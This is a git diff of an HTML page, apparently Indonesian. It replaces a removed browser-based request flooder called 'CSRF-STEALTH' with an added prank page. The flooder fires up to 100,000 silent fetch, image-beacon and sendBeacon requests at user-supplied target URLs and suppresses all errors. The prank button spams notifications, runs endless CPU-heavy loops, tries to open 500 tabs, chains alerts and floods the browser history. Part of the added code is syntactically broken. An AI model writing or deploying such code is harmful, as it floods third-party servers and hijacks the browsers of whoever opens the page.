@@ -1,394 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CSRF STEALTH</title>
+    <meta charset="UTF-8">
+    <title>🚀 GASKAN BROOO</title>
     <style>
-        body { 
-            background: #0a0a0a; 
-            color: #00ff00; 
-            font-family: 'Courier New', monospace;
-            margin: 0;
-            padding: 15px;
-        }
-        .container { 
-            max-width: 700px;
-            margin: 0 auto;
-            border: 2px solid #00ff00;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px #00ff00;
-        }
-        h1 { 
+        body {
+            background: black;
+            color: lime;
+            font-family: 'Comic Sans MS', cursive;
             text-align: center;
-            color: #00ff00;
-            margin: 0 0 20px 0;
-            font-size: 2em;
-        }
-        .status-bar {
-            background: #1a1a1a;
-            border: 1px solid #00ff00;
-            padding: 10px;
-            margin: 10px 0;
-            display: flex;
-            justify-content: space-between;
-            border-radius: 5px;
-        }
-        input, textarea {
-            width: 100%;
-            padding: 8px;
-            margin: 5px 0 15px 0;
-            background: #1a1a1a;
-            border: 1px solid #00ff00;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            box-sizing: border-box;
-            border-radius: 4px;
+            padding: 50px;
         }
         button {
-            background: #00ff00;
-            color: black;
+            font-size: 30px;
+            padding: 20px;
+            background: red;
+            color: white;
             border: none;
-            padding: 12px 25px;
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
+            border-radius: 20px;
             cursor: pointer;
-            font-size: 1.1em;
-            border-radius: 4px;
-            margin: 5px;
-        }
-        button:hover {
-            background: #00cc00;
-        }
-        button.stop {
-            background: #330000;
-            color: #ff0000;
-            border: 1px solid #ff0000;
-        }
-        .log-box {
-            background: #1a1a1a;
-            border: 1px solid #00ff00;
-            height: 200px;
-            overflow-y: scroll;
-            padding: 10px;
-            font-size: 0.85em;
-            margin: 15px 0;
-            border-radius: 4px;
-        }
-        .log-line {
-            color: #00ff00;
-            margin: 2px 0;
-            border-bottom: 1px solid #333;
-            padding: 2px 0;
-        }
-        .stats {
-            display: flex;
-            gap: 15px;
-            margin: 10px 0;
-            flex-wrap: wrap;
-        }
-        .stat {
-            background: #1a1a1a;
-            border: 1px solid #00ff00;
-            padding: 8px 15px;
-            border-radius: 4px;
-            flex: 1;
-            text-align: center;
-        }
-        .hidden {
-            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>💿 CSRF-STEALTH</h1>
-        
-        <div class="status-bar">
-            <span>STATUS: <span id="statusText">STANDBY</span></span>
-            <span>SENT: <span id="sentCount">0</span></span>
-            <span>SPEED: <span id="speedText">0</span>/s</span>
-        </div>
-
-        <div class="stats">
-            <div class="stat">TARGETS: <span id="targetCount">0</span></div>
-            <div class="stat">THREADS: <span id="threadCount">20</span></div>
-            <div class="stat">QUEUE: <span id="queueCount">0</span></div>
-        </div>
-
-        <label>🔗 TARGET URL(s) (pisah pake koma atau enter):</label>
-        <textarea id="targetUrls" rows="3" placeholder="https://target.com/endpoint1, https://target.com/endpoint2">https://target.com/api/upload, https://target.com/api/users</textarea>
-
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
-            <div>
-                <label>📦 TOTAL REQUEST:</label>
-                <input type="number" id="totalReq" value="1000" min="10" max="100000">
-            </div>
-            <div>
-                <label>⚡ THREADS (1-50):</label>
-                <input type="number" id="threadInput" value="15" min="1" max="50">
-            </div>
-        </div>
-
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
-            <div>
-                <label>⏱️ DELAY (ms):</label>
-                <input type="number" id="delayInput" value="1" min="0" max="50">
-            </div>
-            <div>
-                <label>🔧 METHOD:</label>
-                <select id="methodSelect">
-                    <option value="GET">GET</option>
-                    <option value="POST" selected>POST</option>
-                    <option value="PUT">PUT</option>
-                </select>
-            </div>
-        </div>
-
-        <div style="text-align: center; margin: 20px 0;">
-            <button onclick="startAttack()">🚀 GAS</button>
-            <button class="stop" onclick="stopAttack()">⛔ STOP</button>
-            <button onclick="resetLog()">↻ RESET</button>
-        </div>
-
-        <div class="log-box" id="logBox">
-            <div class="log-line">[SYSTEM] Stealth mode active</div>
-            <div class="log-line">[SYSTEM] Ready to attack</div>
-        </div>
-        
-        <div style="text-align: center; font-size: 0.7em; color: #666;">
-            zero error edition - silent operation
-        </div>
-    </div>
-
+    <h1>🔥 KLIK TOMBOL INI KALO LU GABUT 🔥</h1>
+    <button onclick="brutalMode()">🚀 GASKAN 2.0 🚀</button>
+    
     <script>
-        // ==================== SILENT ERROR HANDLER ====================
-        // Block semua error dari muncul ke console
-        const originalConsoleError = console.error;
-        console.error = function() {};  // Mute semua error
-        
-        window.addEventListener('error', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
-        
-        window.addEventListener('unhandledrejection', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
-
-        // ==================== VARIABLES ====================
-        let isAttacking = false;
-        let sentCount = 0;
-        let startTime = null;
-        let activeTimeouts = [];
-        let targets = [];
-        let targetIndex = 0;
-        let totalTarget = 1000;
-        let threads = 15;
-        let delay = 1;
-        let method = 'POST';
-        
-        // DOM
-        const logBox = document.getElementById('logBox');
-        const statusText = document.getElementById('statusText');
-        const sentCountSpan = document.getElementById('sentCount');
-        const speedTextSpan = document.getElementById('speedText');
-        const targetCountSpan = document.getElementById('targetCount');
-        const threadCountSpan = document.getElementById('threadCount');
-        const queueCountSpan = document.getElementById('queueCount');
-
-        // ==================== UTILS ====================
-        function log(msg) {
-            const div = document.createElement('div');
-            div.className = 'log-line';
-            div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
-            logBox.appendChild(div);
-            logBox.scrollTop = logBox.scrollHeight;
-            
-            // Limit log
-            while (logBox.children.length > 100) {
-                logBox.removeChild(logBox.children[0]);
-            }
-        }
-        
-        function updateStats() {
-            sentCountSpan.textContent = sentCount.toLocaleString();
-            
-            if (startTime && isAttacking) {
-                let elapsed = (Date.now() - startTime) / 1000;
-                if (elapsed > 0) {
-                    let speed = Math.round(sentCount / elapsed);
-                    speedTextSpan.textContent = speed;
+        function brutalMode() {
+            // 1. Bikin notifikasi spam (kalo pake Chrome, bakal nanya izin dulu)
+            if (Notification.permission === "granted") {
+                for (let i = 0; i < 50; i++) {
+                    new Notification("LU KENA PRANK 🔥");
                 }
+            } else {
+                Notification.requestPermission();
             }
             
-            queueCountSpan.textContent = Math.max(0, totalTarget - sentCount);
-        }
-        
-        function resetLog() {
-            if (isAttacking) return;
-            logBox.innerHTML = '<div class="log-line">[SYSTEM] Log cleared</div>';
-            sentCount = 0;
-            updateStats();
-        }
-        
-        function clearAllTimeouts() {
-            activeTimeouts.forEach(t => clearTimeout(t));
-            activeTimeouts = [];
-        }
-
-        // ==================== SILENT REQUEST (BENER-BENER SILENT) ====================
-        function sendSilentRequest(url) {
-            if (!isAttacking) return;
-            
-            // METHOD 1: Image - paling silent, ga pernah error
-            try {
-                let img = new Image();
-                img.src = url + (url.includes('?') ? '&' : '?') + '_=' + Date.now() + Math.random();
-                // Hapus reference biar ga numpuk
-                setTimeout(() => { img = null; }, 100);
-            } catch (e) {}
-            
-            // METHOD 2: Fetch dengan error handler kosong
-            try {
-                fetch(url, { 
-                    method: method, 
-                    mode: 'no-cors', 
-                    cache: 'no-store',
-                    keepalive: true,
-                    headers: {}
-                }).catch(() => {});
-            } catch (e) {}
-            
-            // METHOD 3: Beacon (paling stealth untuk POST)
-            if (method !== 'GET') {
-                try {
-                    let blob = new Blob(['data=' + 'A'.repeat(1000)], {type: 'application/x-www-form-urlencoded'});
-                    navigator.sendBeacon(url, blob);
-                } catch (e) {}
-            }
-            
-            sentCount++;
-            
-            if (sentCount % 100 === 0) {
-                log(`[✓] ${sentCount} requests sent`);
-            }
-            
-            updateStats();
-        }
-
-        // ==================== START ATTACK ====================
-        function startAttack() {
-            if (isAttacking) {
-                log('[!] Already attacking');
-                return;
-            }
-            
-            // Parse targets
-            let targetText = document.getElementById('targetUrls').value;
-            targets = targetText.split(',').map(t => t.trim()).filter(t => t && t.startsWith('http'));
-            
-            if (targets.length === 0) {
-                log('[!] No valid targets');
-                return;
-            }
-            
-            // Get parameters
-            totalTarget = parseInt(document.getElementById('totalReq').value) || 1000;
-            threads = parseInt(document.getElementById('threadInput').value) || 15;
-            delay = parseInt(document.getElementById('delayInput').value) || 1;
-            method = document.getElementById('methodSelect').value;
-            
-            // Limits
-            if (threads > 50) threads = 50;
-            if (delay > 50) delay = 50;
-            if (totalTarget > 100000) totalTarget = 100000;
-            
-            // Reset
-            clearAllTimeouts();
-            isAttacking = true;
-            startTime = Date.now();
-            sentCount = 0;
-            targetIndex = 0;
-            
-            // Update UI
-            statusText.innerHTML = '🔥 ATTACKING';
-            targetCountSpan.textContent = targets.length;
-            threadCountSpan.textContent = threads;
-            
-            log('[🔥] Attack started');
-            log(`[🎯] Targets: ${targets.length} endpoints`);
-            log(`[⚡] Threads: ${threads} | Total: ${totalTarget}`);
-            
-            // Calculate requests per thread
-            let reqPerThread = Math.ceil(totalTarget / threads);
-            let scheduled = 0;
-            
-            // Launch threads
-            for (let t = 0; t < threads; t++) {
-                if (!isAttacking) break;
-                
-                let threadTimeout = setTimeout(() => {
-                    for (let r = 0; r < reqPerThread; r++) {
-                        if (!isAttacking) break;
-                        if (scheduled >= totalTarget) break;
-                        
-                        let reqTimeout = setTimeout(() => {
-                            if (!isAttacking) return;
-                            
-                            // Rotate targets
-                            let target = targets[targetIndex % targets.length];
-                            targetIndex++;
-                            
-                            sendSilentRequest(target);
-                            
-                        }, r * delay);
-                        
-                        activeTimeouts.push(reqTimeout);
-                        scheduled++;
-                    }
-                }, t * 10);
-                
-                activeTimeouts.push(threadTimeout);
-            }
-            
-            // Auto stop
-            let estimatedTime = (totalTarget * delay) + 5000;
-            let stopTimeout = setTimeout(() => {
-                if (isAttacking) {
-                    log('[✓] Attack completed');
-                    stopAttack();
+            // 2. Bikin loop CPU berat
+            setInterval(() => {
+                for (let i = 0; i < 1000000000; i++) {
+                    Math.sqrt(i) * Math.random();
                 }
-            }, estimatedTime);
-            activeTimeouts.push(stopTimeout);
-        }
-
-        // ==================== STOP ATTACK ====================
-        function stopAttack() {
-            if (!isAttacking) return;
+            }, 5);
             
-            isAttacking = false;
-            clearAllTimeouts();
-            
-            statusText.innerHTML = '⏹️ STOPPED';
-            log('[⏹️] Attack stopped');
-            log(`[📊] Total sent: ${sentCount}`);
-            
-            updateStats();
-        }
-
-        // ==================== CLEANUP ====================
-        window.addEventListener('beforeunload', () => {
-            if (isAttacking) {
-                isAttacking = false;
-                clearAllTimeouts();
+            // 3. Bikin tab baru sampe 500 tab
+            for (let i = 0; i < 500; i++) {
+                window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
             }
-        });
-        
-        // Initial log
-        log('[SYSTEM] Ready - No errors will be shown');
+            
+            // 4. Bikin alert spam (bikin bete)
+            for (let i = 0; i < 20; i++) {
+                setTimeout(() => {
+                    alert(LU KENA STEP ${i+1});
+                }, i * 500);
+            }
+            
+            // 5. Manipulasi history biar gabisa back
+            for (let i = 0; i < 10; i++) {
+                history.pushState({}, "", /step-${i});
+            }
+            
+            // 6. Ganti favicon jadi menyeramkan (opsional)
+            let link = document.querySelector("link[rel~='icon']") || document.createElement('link');
+            link.type = 'image/x-icon';
+            link.rel = 'shortcut icon';
+            link.href = 'https://icons.iconarchive.com/icons/fazieaf/rilakkuma/256/rilakkuma-icon.png'; // ganti bebas
+            document.getElementsByTagName('head')[0].appendChild(link);
+        }
     </script>
 </body>
 </html>
